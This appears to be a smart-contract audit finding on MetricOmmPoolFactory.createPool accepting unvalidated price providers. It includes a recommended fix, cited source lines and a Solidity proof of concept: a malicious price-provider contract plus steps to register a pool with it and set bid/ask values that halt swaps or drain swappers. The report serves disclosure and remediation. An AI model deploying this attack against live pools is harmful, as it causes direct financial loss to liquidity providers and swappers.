### Title
Unvalidated Price Provider Origin in `MetricOmmPoolFactory.createPool` Allows Arbitrary Bid/Ask Injection into Registered Pools — (`metric-core/contracts/MetricOmmPoolFactory.sol`)

---

### Summary

`MetricOmmPoolFactory.createPool` is permissionless and accepts any `priceProvider` address that satisfies a token-pair match. The factory's `_validatePriceProvider` does not verify that the provider was deployed by an approved provider factory (`PriceProviderFactory`, `PriceProviderFactoryL2`, or `AnchoredProviderFactory`). An attacker can deploy a malicious contract that returns the correct `token0()`/`token1()` but emits arbitrary `getBidAndAskPrice()` values, create a factory-registered pool pointing at it, and cause every swap in that pool to execute at a manipulated price.

---

### Finding Description

`_validatePriceProvider` performs exactly two checks:

```solidity
// metric-core/contracts/MetricOmmPoolFactory.sol:541-546
function _validatePriceProvider(address token0, address token1, address priceProvider) internal view {
    if (priceProvider == address(0)) revert InvalidPriceProvider();
    if (IPriceProvider(priceProvider).token0() != token0 || IPriceProvider(priceProvider).token1() != token1) {
        revert PriceProviderTokenMismatch();
    }
}
```

There is no call to `PriceProviderFactory.isProvider()`, `PriceProviderFactoryL2.isProvider()`, or `AnchoredProviderFactory.isProvider()`. Both provider factories expose exactly this predicate:

```solidity
// smart-contracts-poc/contracts/PriceProviderFactory.sol:148-150
function isProvider(address provider) external view returns (bool) {
    return _providers.contains(provider);
}
```

The `AnchoredProviderFactory` documentation explicitly names this predicate as the intended eligibility gate for public pools:

> "public-pool eligibility is then the machine-checkable predicate `recognizedFactory.isProvider(p)`"

Yet `createPool` never invokes it. A malicious actor can:

1. Deploy a contract implementing `IPriceProvider` with `token0()` / `token1()` returning the legitimate pair addresses and `getBidAndAskPrice()` returning any `(bid, ask)` pair.
2. Call `createPool` with this contract as `params.priceProvider`. The call succeeds and the pool is assigned a canonical `poolToIdx` entry — it appears fully legitimate in the factory registry.
3. Every subsequent `swap` in that pool reads price from the malicious provider with no further validation.

The same gap applies to the price-provider update path (`proposePoolPriceProvider` → `executePoolPriceProviderUpdate`), which also routes through `_validatePriceProvider`.

---

### Impact Explanation

The pool is oracle-anchored: every swap's bin traversal and asset-delta calculation is driven exclusively by the `(bid, ask)` returned by `getBidAndAskPrice()`. A malicious provider can:

- Return `bid = 0, ask = type(uint128).max` to halt all swaps (DoS).
- Return an inverted or extreme spread to cause swappers to receive far fewer output tokens than the true market price warrants — direct loss of principal.
- Return a price that makes the pool appear solvent while LP shares are worth less than the underlying balances, enabling the pool creator to drain LP value through targeted swaps.

Because the pool is registered in `idxToPool` / `poolToIdx`, it is indistinguishable from a legitimately configured pool to any on-chain or off-chain consumer that queries the factory registry.

---

### Likelihood Explanation

`createPool` is explicitly permissionless. Any externally owned account can call it with a crafted `priceProvider`. No privileged role, no special setup, and no malicious initial liquidity is required — the vulnerability is triggered purely by the pool creation call. Users who discover the pool through the factory registry have no on-chain signal that the price provider is unvalidated.

---

### Recommendation

Add an approved-factory registry to `MetricOmmPoolFactory` and enforce it in `_validatePriceProvider`:

```solidity
// In MetricOmmPoolFactory state:
EnumerableSet.AddressSet private _approvedProviderFactories;

// In _validatePriceProvider:
function _validatePriceProvider(address token0, address token1, address priceProvider) internal view {
    if (priceProvider == address(0)) revert InvalidPriceProvider();
    if (IPriceProvider(priceProvider).token0() != token0 || IPriceProvider(priceProvider).token1() != token1) {
        revert PriceProviderTokenMismatch();
    }
    // NEW: require the provider to be tracked by an approved factory
    bool recognized;
    for (uint256 i; i < _approvedProviderFactories.length(); i++) {
        if (IProviderFactory(_approvedProviderFactories.at(i)).isProvider(priceProvider)) {
            recognized = true;
            break;
        }
    }
    if (!recognized) revert PriceProviderNotFromApprovedFactory();
}
```

Alternatively, maintain a flat `mapping(address => bool) public approvedPriceProvider` updated by the factory owner, which is cheaper and avoids the loop.

---

### Proof of Concept

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.35;

import {IPriceProvider} from "metric-core/contracts/interfaces/IPriceProvider/IPriceProvider.sol";

/// @notice Malicious price provider: passes token validation, returns manipulated prices.
contract MaliciousPriceProvider is IPriceProvider {
    address public immutable token0;
    address public immutable token1;
    uint128 public bid;
    uint128 public ask;

    constructor(address _t0, address _t1) { token0 = _t0; token1 = _t1; }

    function setBidAsk(uint128 _bid, uint128 _ask) external { bid = _bid; ask = _ask; }

    function getBidAndAskPrice() external view override returns (uint128, uint128) {
        return (bid, ask);
    }
}

// Attack:
// 1. Deploy MaliciousPriceProvider(token0, token1)
// 2. factory.createPool(params with priceProvider = address(malicious))
//    → succeeds; pool is registered in poolToIdx
// 3. malicious.setBidAsk(1, type(uint128).max)  // halt all swaps
//    OR
//    malicious.setBidAsk(extremelyLowBid, extremelyHighAsk)  // drain swappers
// 4. Any user swapping in the pool receives the manipulated price
``` [1](#0-0) [2](#0-1) [3](#0-2) [4](#0-3) [5](#0-4) [6](#0-5)

### Citations

**File:** metric-core/contracts/MetricOmmPoolFactory.sol (L149-151)
```text
  function isPool(address pool) external view override returns (bool) {
    return poolToIdx[pool] != 0;
  }
```

**File:** metric-core/contracts/MetricOmmPoolFactory.sol (L156-204)
```text
  function createPool(PoolParameters calldata params) external override returns (address pool) {
    if (poolDeployer == address(0)) revert PoolDeployerNotSet();
    _validatePoolParameters(params);
    (uint256 token0ScaleMultiplier, uint256 token1ScaleMultiplier) = _getScaleMultipliers(params.token0, params.token1);
    (BinState[] memory nonNegativeBinStates, BinState[] memory negativeBinStates) = _unpackAndValidateBinStates(
      params.curBinDistFromProvidedPriceE6, params.nonNegativeBinDataArray, params.negativeBinDataArray
    );

    bool immutablePriceProvider = params.priceProviderTimelock == type(uint256).max;

    uint256 initialScaledAmount0PerShareE18 = params.initialAmount0PerShareE18 * token0ScaleMultiplier;
    uint256 initialScaledAmount1PerShareE18 = params.initialAmount1PerShareE18 * token1ScaleMultiplier;
    if (initialScaledAmount0PerShareE18 >= type(uint128).max || initialScaledAmount1PerShareE18 >= type(uint128).max) {
      revert InitialScaledAmountExceedsUint128(initialScaledAmount0PerShareE18, initialScaledAmount1PerShareE18);
    }

    ValidateExtensionsConfig.validateExtensionsConfig(
      params.extensions, params.extensionOrders, params.extensionInitData
    );

    uint24 spreadFeeE6 = uint24(uint256(spreadProtocolFeeE6) + uint256(params.adminSpreadFeeE6));
    uint24 notionalFeeE8 = uint24(uint256(protocolNotionalFeeE8) + uint256(params.adminNotionalFeeE8));
    PoolExtensions memory poolExtensions = _poolExtensionsFromArray(params.extensions);

    pool = MetricOmmPoolDeployer(poolDeployer)
      .deploy(
        MetricOmmPoolDeployer.DeployParams({
        salt: params.salt,
        factory: address(this),
        admin: params.admin,
        adminFeeDestination: params.adminFeeDestination,
        token0: params.token0,
        token1: params.token1,
        priceProvider: params.priceProvider,
        extensions: poolExtensions,
        extensionOrders: params.extensionOrders,
        immutablePriceProvider: immutablePriceProvider,
        token0ScaleMultiplier: token0ScaleMultiplier,
        token1ScaleMultiplier: token1ScaleMultiplier,
        initialScaledAmount0PerShareE18: initialScaledAmount0PerShareE18,
        initialScaledAmount1PerShareE18: initialScaledAmount1PerShareE18,
        minimalMintableLiquidity: params.minimalMintableLiquidity,
        spreadFeeE6: spreadFeeE6,
        curBinDistFromProvidedPriceE6: params.curBinDistFromProvidedPriceE6,
        nonNegativeBinStates: nonNegativeBinStates,
        negativeBinStates: negativeBinStates,
        notionalFeeE8: notionalFeeE8
      })
      );
```

**File:** metric-core/contracts/MetricOmmPoolFactory.sol (L541-546)
```text
  function _validatePriceProvider(address token0, address token1, address priceProvider) internal view {
    if (priceProvider == address(0)) revert InvalidPriceProvider();
    if (IPriceProvider(priceProvider).token0() != token0 || IPriceProvider(priceProvider).token1() != token1) {
      revert PriceProviderTokenMismatch();
    }
  }
```

**File:** metric-core/contracts/MetricOmmPoolFactory.sol (L548-563)
```text
  function _validatePoolParameters(PoolParameters calldata params) internal view {
    if (params.token0 == address(0) || params.token1 == address(0) || params.token0 == params.token1) {
      revert InvalidTokenConfig();
    }
    if (params.admin == address(0)) revert InvalidAdmin();
    _validatePriceProvider(params.token0, params.token1, params.priceProvider);
    if (params.adminFeeDestination == address(0)) revert InvalidAdminFeeDestination();
    if (spreadProtocolFeeE6 > maxProtocolSpreadFeeE6) revert ProtocolFeeTooHigh();
    if (protocolNotionalFeeE8 > maxProtocolNotionalFeeE8) revert ProtocolFeeTooHigh();
    if (params.adminSpreadFeeE6 > maxAdminSpreadFeeE6) revert AdminFeeTooHigh();
    if (params.adminNotionalFeeE8 > maxAdminNotionalFeeE8) revert AdminFeeTooHigh();
    if (params.initialAmount0PerShareE18 == 0 || params.initialAmount1PerShareE18 == 0) {
      revert InvalidInitialAmount();
    }
    if (params.minimalMintableLiquidity == 0) revert InvalidMinimalMintableLiquidity();
  }
```

**File:** smart-contracts-poc/contracts/PriceProviderFactory.sol (L148-150)
```text
    function isProvider(address provider) external view returns (bool) {
        return _providers.contains(provider);
    }
```

**File:** smart-contracts-poc/contracts/AnchoredProviderFactory.sol (L10-16)
```text
/// @notice Anchor Factory: deploys AnchoredPriceProviders against an ADMIN-curated allow-list of
///         reference oracles, with clamp parameters validated against multisig-tuned pair-class
///         envelopes. createAnchoredProvider names which allow-listed oracle to anchor to; public-pool
///         eligibility is then the machine-checkable predicate `recognizedFactory.isProvider(p)`.
///         The allow-list starts EMPTY at construction and is populated/curated via addOracle /
///         removeOracle (admin) — removal only blocks NEW providers; already-deployed providers keep
///         their immutable oracle and stay isProvider()==true.
```
